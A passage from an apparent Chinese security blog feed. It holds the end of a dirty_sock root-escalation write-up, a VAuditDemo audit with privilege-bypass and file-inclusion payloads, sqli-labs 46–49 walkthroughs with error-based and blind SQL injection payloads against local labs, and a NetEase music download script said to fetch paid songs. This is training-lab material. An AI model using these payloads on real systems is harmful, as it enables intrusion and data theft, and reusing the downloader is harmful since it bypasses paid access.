src="https://s2.ax1x.com/2019/02/14/kB3qjU.png" alt="kB3qjU.png"></p><p>然后他会创建dirty_sock用户，密码也是dirty_sock，su dirty_sock输入密码，然后在sudo -i ,输入dirty_sock的密码，切换到root用户即可</p><p><img src="https://s2.ax1x.com/2019/02/14/kB8S41.png" alt="kB8S41.png"></p><p><img src="https://s2.ax1x.com/2019/02/14/kB899x.png" alt="kB899x.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Shooting field audit summary</title>
      <link href="/posts/9cb056fa.html"/>
      <url>/posts/9cb056fa.html</url>
      <content type="html"><![CDATA[<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><hr><ul><li>说明</li><li>前言</li><li>审计过程</li><li>小结</li></ul><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr><p>下午审计了一波，成功用burp把环境搞崩= =哈哈哈<br><img src="http://p1.pstatp.com/large/pgc-image/152299419224284d5b16a1d" alt="152299419224284d5b16a1d"></p><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><hr><p>V靶场全名(VAuditDemo_Debug),我这里简称V</p><h3 id="审计过程"><a href="#审计过程" class="headerlink" title="审计过程"></a>审计过程</h3><hr><p>这是我之前审计过的地方（我扔博客里了，这里就不在重复）：</p><p><b>越权的发现</b><br>代码路径：</p><pre><code>\VAuditDemo-master\VAuditDemo_Debug\user\UpdateName.php</code></pre><p>代码如下：</p><pre><code class="php">&lt;?phpinclude_once(&#39;../sys/config.php&#39;);if (isset($_POST[&#39;submit&#39;]) &amp;&amp; !empty($_POST[&#39;username&#39;]) ) { /*判断是否存在POST请求的submit和username参数*/    if (strlen($_POST[&#39;username&#39;])&gt;16) { /*判断用户名是否长过16位*/        $_SESSION[&#39;error_info&#39;] = &#39;用户名過長（用戶名長度&lt;=16）&#39;;        header(&#39;Location: edit.php&#39;);        exit;    }    $clean_username = clean_input($_POST[&#39;username&#39;]);    $clean_user_id = clean_input($_POST[&#39;id&#39;]);    //判断用户名已是否存在    $query = &quot;SELECT * FROM users WHERE user_name = &#39;$clean_username&#39;&quot;; /*b不存在SQL注入*/    $data = mysql_query($query, $conn);    if (mysql_num_rows($data) == 1) {        $_SESSION[&#39;error_info&#39;] = &#39;用户名已存在&#39;;        header(&#39;Location: edit.php&#39;);        exit;    }    $query = &quot;UPDATE users SET user_name = &#39;$clean_username&#39; WHERE user_id = &#39;$clean_user_id&#39;&quot;; /*b不存在SQL注入*/    mysql_query($query, $conn) or die(&quot;update error!&quot;);    mysql_close($conn);    //刷新缓存    $_SESSION[&#39;username&#39;] = $clean_username;    header(&#39;Location: edit.php&#39;);}else {    not_find($_SERVER[&#39;PHP_SELF&#39;]);}/*1.先判断是否有POST请求2.判断新的用户名是否长过16位3.判断用户名是否存在4.更新数据库名PS：少了检测请求的ID是否等于用户的id，也就是说通过修改这个ID就能达到修改别的用户的名称实现平行越权*/?&gt;</code></pre><p>实验：</p><pre><code>第一个用户：admins 密码：admin第二个用户：我喜欢你 密码：111111</code></pre><p>使用我喜欢你这个用户来改admins用户的用户名：<br><img src="https://s2.ax1x.com/2019/02/12/kdXEex.png" alt="kdXEex.png"></p><p>修改前的数据库：<br><img src="https://s2.ax1x.com/2019/02/12/kdXNtS.png" alt="kdXNtS.png"></p><p>Burp抓包重放：<br><img src="https://s2.ax1x.com/2019/02/12/kdXdpQ.png" alt="kdXdpQ.png"></p><p>修改后的数据库：<br><img src="https://s2.ax1x.com/2019/02/12/kdXwlj.png" alt="kdXwlj.png"></p><p><b>文件包含漏洞</b><br>在审计别的洞的时间用burp扫了一波，发现index.php居然有文件包含= =<br>burp扫描配置如下：<br><img src="https://s2.ax1x.com/2019/02/12/kwVgN4.md.png" alt="kwVgN4.md.png"></p><p><img src="https://s2.ax1x.com/2019/02/12/kwV24J.png" alt="kwV24J.png"></p><p>文件包含：<br><img src="https://s2.ax1x.com/2019/02/12/kwVIu6.png" alt="kwVIu6.png"></p><p>index.php</p><pre><code class="php">&lt;?php require_once(&#39;sys/config.php&#39;);require_once(&#39;header.php&#39;);?&gt;&lt;div class=&quot;row&quot;&gt;    &lt;?php    /* Include */    if (isset($_GET[&#39;module&#39;])){        include($_GET[&#39;module&#39;].&#39;.inc&#39;);/*指定后缀*/    }else{    ?&gt;    &lt;div class=&quot;jumbotron&quot; style=&quot;text-align: center;&quot;&gt;        &lt;h1&gt;&lt;b&gt;VAuditDemo&lt;/b&gt;&lt;/h1&gt;        &lt;p&gt;一个简单的Web漏洞演练平台&lt;/p&gt;&lt;br /&gt;    &lt;/div&gt;    &lt;div class=&quot;col-lg-12&quot;&gt;        &lt;h2&gt;用於演示講解PHP基本漏洞&lt;/h2&gt;        &lt;p&gt;&lt;/p&gt;    &lt;/div&gt;    &lt;?php    }    ?&gt;&lt;/div&gt;&lt;?phprequire_once(&#39;footer.php&#39;);?&gt;</code></pre><p>绕过方法有两种：</p><pre><code>1.远程文件包含 要求：allow_url_fopen开启2.zip协议  要求：zip协议没被禁止,知道绝对路径</code></pre><p>远程包含payload如下：</p><pre><code>http://127.0.0.1/index.php?module=http://127.0.0.1/1.txt?</code></pre><p><img src="https://s2.ax1x.com/2019/02/12/kwVvvt.png" alt="kwVvvt.png"></p><p>ZIP协议如下：</p><pre><code>http://127.0.0.1/index.php?module=zip://I:\phpstudy\PHPTutorial\WWW\VAuditDemo-master\VAuditDemo_Debug\demo.zip%23</code></pre><p><img src="https://s2.ax1x.com/2019/02/12/kwZVvq.png" alt="kwZVvq.png"></p><p>压缩包图片：<br><img src="https://s2.ax1x.com/2019/02/12/kwZmrV.png" alt="kwZmrV.png"></p><p>这里有个坑：就是你用zip协议的时候压缩包里面文件名一定要一样不然不行的，如果他指定后缀名<br>你就两个后缀名 比如：</p><pre><code>指定后缀为：dd.txt 那么你压缩包里面就要放个dd.txt指定后缀名为：.inc和上面一样那么压缩包放个.inc.inc</code></pre><p>靶场下载地址：<a href="http://t.cn/Ec19F3B" target="_blank" rel="noopener">http://t.cn/Ec19F3B</a></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><hr><pre><code class="php">快速判断是否有SQL注入，在带入数据库查询之前看看参数是否有使用什么函数之类的，有就直接过，除非数据库编码是GBK，如果是黑名单替换，看看是否能绕过在框架的php文件里面快速搜索include这个关键词，看看哪里有参数可控的地方，如果有测试一下说不定能找到个文件包含</code></pre><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Netease cloud music download</title>
      <link href="/posts/733bcb3d.html"/>
      <url>/posts/733bcb3d.html</url>
      <content type="html"><![CDATA[<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><hr><ul><li>前言</li><li>思路</li><li>代码</li></ul><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr><p>想写个能下载网易云歌曲的那种东西来逗逗女孩子开心，当然付费的那种也行。就是抓了某个网易云某接口吧，不知道是不是。朋友先写点后来瞎翻东西的时候看到的，后面也自己也写了一个单是反现之前那个太烂了。果断重写<br><img src="http://5b0988e595225.cdn.sohucs.com/images/20181011/7d14bd14a8074bfb8fed5e78d6603510.jpeg" alt="7d14bd14a8074bfb8fed5e78d6603510.jpeg"></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><hr><p>由于那个接口下载歌曲要获取歌曲的ID才能下载，类似于以下这样：<br>（拿全职猎人的departure这首歌的URL来说，url后面的id就是歌曲下载的id）</p><pre><code>全职猎人departure!：https://music.163.com/#/song?id=496618访问下载接口：http://music.163.com/song/media/outer/url?id=496618.mp3得到最终下载地址：http://m10.music.126.net/20190212143936/506150fe805d1a57e81122e0f2e2bf00/ymusic/973f/38a2/f492/d3ff0469103cdb1ecba8c4864ec2659c.mp3</code></pre><p>得到思路：</p><pre><code>1.先写个搜索歌曲的功能，通过抓包可以看到json返回的结果里有歌曲名称和歌曲id2.然后在进行访问接口3.最终得到 完整的下载地址然后进行下载4.由于这个下载地址一打开就会自动放歌，添加一个试听的功能</code></pre><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><hr><p>PS：解密脚本，由于网易云搜索是有加密的，这里我看了半天看不懂直接CV别人的来用了<br>分析网易云音乐加密文章来源：<br><a href="https://zhuanlan.zhihu.com/p/34114167" target="_blank" rel="noopener">网易云音乐Ajax Post参数加密方法 - 知乎</a><br><a href="http://link.zhihu.com/?target=https%3A//github.com/leo0309/wangyiyunMusicAjaxAnalysis" target="_blank" rel="noopener">netEaseMuiscEncrypot.py来源</a></p><p>netEaseMuiscEncrypot.py</p><pre><code class="python">import jsonfrom Crypto.Cipher import AESimport base64from Crypto.PublicKey import RSAimport codecsimport random#PKCS_7方式进行补位def pad(data:bytes,blockbytes:int=16):    &quot;&quot;&quot;    data:需要补位的bytes    blockbytes:块bytes大小    &quot;&quot;&quot;    _data = data    #判断是否是字符串，如果是则按utf8编码为bytes    if isinstance(_data,str):        _data = _data.encode(&#39;utf8&#39;)    length = len(_data)    pad_length = blockbytes - length % blockbytes    padding = (chr(pad_length)*pad_length).encode(&#39;utf8&#39;)    _data += padding    return _data#dict序列化def dictSerialize(data:dict):    if not isinstance(data,dict):        _data = dict(data)    _data = data    _data = json.dumps(_data,ensure_ascii=False)    return _data#生成随机值用于AES第二阶段加密的密钥def rand_a(a=16):    b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;    c = &quot;&quot;    length = len(b)    for _ in range(a):        c += b[int(random.random()*length)]    return c#aes加密def aes_encrypt(data,key,iv,mode=AES.MODE_CBC):    &quot;&quot;&quot;    data:明文    key:密钥    iv:偏移量    mode:模式，默认为CBC模式    &quot;&quot;&quot;    encryptor=AES.new(key.encode(&#39;utf-8&#39;),mode=mode,IV=iv.encode(&#39;utf-8&#39;))    #补位操作    _data = pad(data,16)    encrypted_data = encryptor.encrypt(_data)    return base64.b64encode(encrypted_data)#aes解密def aes_decrypt(data,key,iv,mode=AES.MODE_CBC):    &quot;&quot;&quot;    data:密文    key:密钥    iv:偏移量    mode:模式，默认为CBC模式    &quot;&quot;&quot;    decryptor = AES.new(key,mode=mode,IV=iv)    return decryptor.decrypt(data)def netEase_AES_encrypt(data,key1,key2,iv,mode=AES.MODE_CBC):    &quot;&quot;&quot;    data:明文    key1:第一阶段密钥    key2:第二阶段密钥    iv:偏移量    mode:模式，默认为CBC模式    &quot;&quot;&quot;    if isinstance(data,dict):        _data = dictSerialize(data)    _data = str(data)    _encryptedData = aes_encrypt(_data,key1,iv,mode)    _encryptedData = aes_encrypt(_encryptedData,key2,iv,mode)    return _encryptedData.decode(&#39;utf8&#39;)def netEase_AES_decryot(data,key1,key2,iv,mode=AES.MODE_CBC):    &quot;&quot;&quot;    data:密文    key1:第一阶段加密函数    key2:第二阶段加密函数    iv:偏移量    mode:模式，默认为CBC模式    &quot;&quot;&quot;    _data = base64.b64decode(data)    plaintext = aes_decrypt(_data,key2,iv,mode)    plaintext = base64.b64decode(plaintext)    plaintext = aes_decrypt(plaintext,key1,iv,mode)    plaintext = plaintext.decode(&#39;utf8&#39;)    return plaintextdef netEase_RSA_encrypt_NoPadding(data:str,publickey:str,module:str):    &quot;&quot;&quot;    RSA采用Nopadding方式，即明文先倒排，再在前面补0    data:明文    publickey:公钥    module:RSA中两个大质数的乘积    &quot;&quot;&quot;    #网易云云音乐中js加密采用的算法中的参数是以16进制来操作的    _publickey = int(publickey,16)    _module = int(module,16)    _data = data[::-1]    _data = int(codecs.encode(_data.encode(&#39;utf8&#39;),&#39;hex&#39;),16)    #RSA加密过程    rs = _data**_publickey%_module    #返回16进制解码，前面补0补足256位的字符串    return format(rs,&#39;x&#39;).zfill(256)</code></pre><p>search.py</p><pre><code class="python">#author:九世#time:2019/2/11import requestsfrom netEaseMusicEncrypt import rand_a, netEase_AES_encrypt,netEase_RSA_encrypt_NoPadding,dictSerialize,aes_encryptimport webbrowserimport osmusica={}print(&#39;作者：By 九世&#39;)print(&#39;网易云音乐搜索&#39;)print(&#39;&#39;)user = input(&#39;输入你要搜索的歌手或歌曲名称：&#39;)query = {&quot;s&quot;: &quot;{}&quot;.format(user), &quot;limit&quot;: &quot;8&quot;, &quot;csrf_token&quot;: &quot;&quot;}key1 = &quot;0CoJUm6Qyw8W8jud&quot;iv = &quot;0102030405060708&quot;    # 公钥对，hex16进制编码module = &quot;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68a\ce615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&quot;publickey = &quot;010001&quot;    # 序列化查询dictqueryStr = dictSerialize(query)aaa = aes_encrypt(queryStr, key1, iv)    # AES加密随机量key2 = rand_a()secretStr = netEase_AES_encrypt(queryStr, key1, key2, iv)  # 加密后的paramsrsaSec = netEase_RSA_encrypt_NoPadding(key2, publickey, module)  # 加密后的keyclass Search:    def __init__(self,headers,url,data):        self.headers=headers        self.url=url        self.data=data    def reqt(self):        try:            rqt=requests.post(url=self.url,headers=self.headers,data=self.data)            jsons=rqt.json()            result=jsons[&#39;result&#39;]            songs=result[&#39;songs&#39;]            for s in songs:                print(&#39;歌曲名称：{} 下载ID：{}&#39;.format(s[&#39;name&#39;],s[&#39;id&#39;]))                musica[s[&#39;name&#39;]]=s[&#39;id&#39;]        except Exception as r:            print(&#39;[-] 报错：{}&#39;.format(r))            return &#39;&#39;        return 1    def music(self):        print(&#39;&#39;)        ids=input(&#39;请输入歌曲的名称,q退出：&#39;)        if ids in musica.keys():            print(&#39;[+] 自动打开默认浏览器，在线试听&#39;)            value=musica.get(ids)            url=&#39;http://music.163.com/song/media/outer/url?id={}&#39;.format(value)            webbrowser.open(url)        elif ids==&#39;q&#39;:            print(&#39;退出...&#39;)            exit()        else:            print(&#39;[-] 找不到歌曲&#39;)    def download(self):        print(&#39;&#39;)        ids = input(&#39;请输入歌曲的名称，q是退出：&#39;)        if ids in musica.keys():            print(&#39;[+] 下载中&#39;)            value = musica.get(ids)            url = &#39;http://music.163.com/song/media/outer/url?id={}&#39;.format(value)            rst=requests.get(url=url,headers=self.headers)            rst2=requests.get(url=rst.url,headers=self.headers)            xj=open(&#39;file/{}.mp3&#39;.format(ids),&#39;wb&#39;)            xj.write(rst2.content)            xj.close()            if os.path.exists(&#39;file/{}.mp3&#39;.format(ids)):                print(&#39;[+] {}.mp3  下载成功&#39;.format(ids))            else:                print(&#39;[-] {}.mp3 下载失败&#39;.format(ids))        elif ids==&#39;q&#39;:            print(&#39;退出...&#39;)            exit()        else:            print(&#39;[-] 找不到歌曲&#39;)if __name__ == &#39;__main__&#39;:    headers={&#39;user-agent&#39;:&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#39;,&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;}    url=&#39;http://music.163.com/weapi/search/suggest/web?csrf_token=&#39;    data={&#39;params&#39;:secretStr,&#39;encSecKey&#39;:rsaSec}    obj=Search(headers=headers,url=url,data=data)    rs=obj.reqt()    while True:        if rs==1:            print(&#39;1.自动打开浏览器试听&#39;)            print(&#39;2.下载&#39;)            print(&#39;0.退出&#39;)            useq=input(&#39;请选择：&#39;)            if useq==&#39;1&#39;:                while True:                    obj.music()            elif useq==&#39;2&#39;:                while True:                    obj.download()            elif useq==&#39;0&#39;:                print(&#39;退出...&#39;)                exit()            else:                print(&#39;[-] 没有这个选择&#39;)</code></pre><p>最终测试结果：<br><img src="https://s2.ax1x.com/2019/02/12/kdT0ZF.png" alt="kdT0ZF.png"></p><p><img src="https://s2.ax1x.com/2019/02/12/kdTyGR.md.jpg" alt="kdTyGR.md.jpg"></p><p><img src="https://s2.ax1x.com/2019/02/12/kdT6R1.png" alt="kdT6R1.png"></p><p>然后打包成EXE扔给她:</p><pre><code>pyinstaller  -F &lt;file&gt;</code></pre><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs Less 46 -&gt; 49</title>
      <link href="/posts/5020e8a3.html"/>
      <url>/posts/5020e8a3.html</url>
      <content type="html"><![CDATA[<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul><li>前言</li><li>sqli-labs第46关到第49关</li></ul><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>复习了一波注入和顺便闯了几关。这次是46-49关<br><img src="http://i0.hdslb.com/bfs/archive/ba2e3758b8732b793928efff31139de0538b728a.jpg" alt="ba2e3758b8732b793928efff31139de0538b728a.jpg"></p><h2 id="sqli-labs第46关到49关"><a href="#sqli-labs第46关到49关" class="headerlink" title="sqli-labs第46关到49关"></a>sqli-labs第46关到49关</h2><ul><li>第46关</li><li>第47关</li><li>第48关</li><li>第49关</li></ul><p><b>第46关</b></p><hr><p>代码如下：</p><pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;ORDER BY-Error-Numeric&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?phpinclude(&quot;../sql-connections/sql-connect.php&quot;);$id=$_GET[&#39;sort&#39;];    if(isset($id))    {    //logging the connection parameters to a file for analysis.    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);    fwrite($fp,&#39;SORT:&#39;.$id.&quot;\n&quot;);    fclose($fp);    $sql = &quot;SELECT * FROM users ORDER BY $id&quot;;    $result = mysql_query($sql);    if ($result)        {        ?&gt;        &lt;center&gt;        &lt;font color= &quot;#00FF00&quot; size=&quot;4&quot;&gt;        &lt;table   border=1&#39;&gt;        &lt;tr&gt;            &lt;th&gt;&amp;nbsp;ID&amp;nbsp;&lt;/th&gt;            &lt;th&gt;&amp;nbsp;USERNAME&amp;nbsp;  &lt;/th&gt;            &lt;th&gt;&amp;nbsp;PASSWORD&amp;nbsp;  &lt;/th&gt;        &lt;/tr&gt;        &lt;/font&gt;        &lt;/font&gt;        &lt;?php        while ($row = mysql_fetch_assoc($result))            {            echo &#39;&lt;font color= &quot;#00FF11&quot; size=&quot;3&quot;&gt;&#39;;                    echo &quot;&lt;tr&gt;&quot;;                echo &quot;&lt;td&gt;&quot;.$row[&#39;id&#39;].&quot;&lt;/td&gt;&quot;;                echo &quot;&lt;td&gt;&quot;.$row[&#39;username&#39;].&quot;&lt;/td&gt;&quot;;                echo &quot;&lt;td&gt;&quot;.$row[&#39;password&#39;].&quot;&lt;/td&gt;&quot;;            echo &quot;&lt;/tr&gt;&quot;;            echo &quot;&lt;/font&gt;&quot;;            }            echo &quot;&lt;/table&gt;&quot;;        }        else        {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        print_r(mysql_error());        echo &quot;&lt;/font&gt;&quot;;          }    }        else    {        echo &quot;Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/Less-46.jpg&quot; /&gt;&lt;br&gt;&#39;;        echo &quot;Lesson Concept and code Idea by &lt;b&gt;D4rk&lt;/b&gt;&quot;;    }?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/center&gt; &lt;/body&gt;&lt;/html&gt;</code></pre><p>查询语句是</p><pre><code class="mysql">select * from users order by id=</code></pre><p><img src="https://s2.ax1x.com/2019/02/11/ka0feO.md.png" alt=""><br>根据查询语句给出payload</p><pre><code>报错注入：http://127.0.0.1/sqli-labs-master/Less-46/?sort=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)盲注：http://127.0.0.1/sqli-labs-master/Less-46/?sort=rand(ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%22security%22%20limit%200,1),6,1)))盲注时返回的数据不一样</code></pre><p><img src="https://s2.ax1x.com/2019/02/11/ka0IFH.png" alt="ka0IFH.png"><br><img src="https://s2.ax1x.com/2019/02/11/ka0HSI.png" alt="ka0HSI.png"></p><p><b>第四十七关</b></p><hr><p>代码如下：</p><pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;ORDER BY Clause-Error-Single quote&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?phpinclude(&quot;../sql-connections/sql-connect.php&quot;);$id=$_GET[&#39;sort&#39;];    if(isset($id))    {    //logging the connection parameters to a file for analysis.    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);    fwrite($fp,&#39;SORT:&#39;.$id.&quot;\n&quot;);    fclose($fp);    $sql = &quot;SELECT * FROM users ORDER BY &#39;$id&#39;&quot;;    echo $sql.&quot;&lt;br&gt;&quot;;    $result = mysql_query($sql);    if ($result)        {        ?&gt;        &lt;center&gt;        &lt;font color= &quot;#00FF00&quot; size=&quot;4&quot;&gt;        &lt;table   border=1&#39;&gt;        &lt;tr&gt;            &lt;th&gt;&amp;nbsp;ID&amp;nbsp;&lt;/th&gt;            &lt;th&gt;&amp;nbsp;USERNAME&amp;nbsp;  &lt;/th&gt;            &lt;th&gt;&amp;nbsp;PASSWORD&amp;nbsp;  &lt;/th&gt;        &lt;/tr&gt;        &lt;/font&gt;        &lt;/font&gt;        &lt;?php        while ($row = mysql_fetch_assoc($result))            {            echo &#39;&lt;font color= &quot;#00FF11&quot; size=&quot;3&quot;&gt;&#39;;                    echo &quot;&lt;tr&gt;&quot;;                echo &quot;&lt;td&gt;&quot;.$row[&#39;id&#39;].&quot;&lt;/td&gt;&quot;;                echo &quot;&lt;td&gt;&quot;.$row[&#39;username&#39;].&quot;&lt;/td&gt;&quot;;                echo &quot;&lt;td&gt;&quot;.$row[&#39;password&#39;].&quot;&lt;/td&gt;&quot;;            echo &quot;&lt;/tr&gt;&quot;;            echo &quot;&lt;/font&gt;&quot;;            }            echo &quot;&lt;/table&gt;&quot;;        }    else        {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        print_r(mysql_error());        echo &quot;&lt;/font&gt;&quot;;          }    }        else    {        echo &quot;Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/Less-47.jpg&quot; /&gt;&lt;br&gt;&#39;;        echo &quot;Lesson Concept and code Idea by &lt;b&gt;D4rk&lt;/b&gt;&quot;;    }?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/center&gt; &lt;/body&gt;&lt;/html&gt;</code></pre><p>查询语句是：</p><pre><code class="mysql">select * from users order by id=&#39;1&#39;</code></pre><p>我们要闭合查询语句，注入语句如下：</p><pre><code class="mysql">&#39;&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1)|&#39;1</code></pre><p><img src="https://s2.ax1x.com/2019/02/11/kaBYAe.png" alt=""></p><p><b>第四十八关</b></p><hr><p>代码如下：</p><pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;ORDER BY Clause Blind based&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?phpinclude(&quot;../sql-connections/sql-connect.php&quot;);$id=$_GET[&#39;sort&#39;];    if(isset($id))    {    //logging the connection parameters to a file for analysis.    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);    fwrite($fp,&#39;SORT:&#39;.$id.&quot;\n&quot;);    fclose($fp);    $sql = &quot;SELECT * FROM users ORDER BY $id&quot;;    $result = mysql_query($sql);    if ($result)        {        ?&gt;        &lt;center&gt;        &lt;font color= &quot;#00FF00&quot; size=&quot;4&quot;&gt;        &lt;table   border=1&#39;&gt;        &lt;tr&gt;            &lt;th&gt;&amp;nbsp;ID&amp;nbsp;&lt;/th&gt;            &lt;th&gt;&amp;nbsp;USERNAME&amp;nbsp;  &lt;/th&gt;            &lt;th&gt;&amp;nbsp;PASSWORD&amp;nbsp;  &lt;/th&gt;        &lt;/tr&gt;        &lt;/font&gt;        &lt;/font&gt;        &lt;?php        while ($row = mysql_fetch_assoc($result))            {            echo &#39;&lt;font color= &quot;#00FF11&quot; size=&quot;3&quot;&gt;&#39;;                    echo &quot;&lt;tr&gt;&quot;;                echo &quot;&lt;td&gt;&quot;.$row[&#39;id&#39;].&quot;&lt;/td&gt;&quot;;                echo &quot;&lt;td&gt;&quot;.$row[&#39;username&#39;].&quot;&lt;/td&gt;&quot;;                echo &quot;&lt;td&gt;&quot;.$row[&#39;password&#39;].&quot;&lt;/td&gt;&quot;;            echo &quot;&lt;/tr&gt;&quot;;            echo &quot;&lt;/font&gt;&quot;;            }            echo &quot;&lt;/table&gt;&quot;;        }    }        else    {        echo &quot;Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/Less-47.jpg&quot; /&gt;&lt;br&gt;&#39;;        echo &quot;Lesson Concept and code Idea by &lt;b&gt;D4rk&lt;/b&gt;&quot;;    }?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/center&gt; &lt;/body&gt;&lt;/html&gt;</code></pre><p>由于没有输出mysql报错，只能盲注了</p><pre><code class="sql">http://127.0.0.1/sqli-labs-master/Less-48/?sort=rand(length(database())=8)</code></pre><p><img src="https://s2.ax1x.com/2019/02/11/karj0K.md.png" alt=""></p><p><b>第四十九关</b></p><hr><p>代码如下：</p><pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;ORDER BY Clause Blind based&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?phpinclude(&quot;../sql-connections/sql-connect.php&quot;);$id=$_GET[&#39;sort&#39;];    if(isset($id))    {    //logging the connection parameters to a file for analysis.    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);    fwrite($fp,&#39;SORT:&#39;.$id.&quot;\n&quot;);    fclose($fp);    $sql = &quot;SELECT * FROM users ORDER BY &#39;$id&#39;&quot;;    $result = mysql_query($sql);    if ($result)        {        ?&gt;        &lt;center&gt;        &lt;font color= &quot;#00FF00&quot; size=&quot;4&quot;&gt;        &lt;table   border=1&#39;&gt;        &lt;tr&gt;            &lt;th&gt;&amp;nbsp;ID&amp;nbsp;&lt;/th&gt;            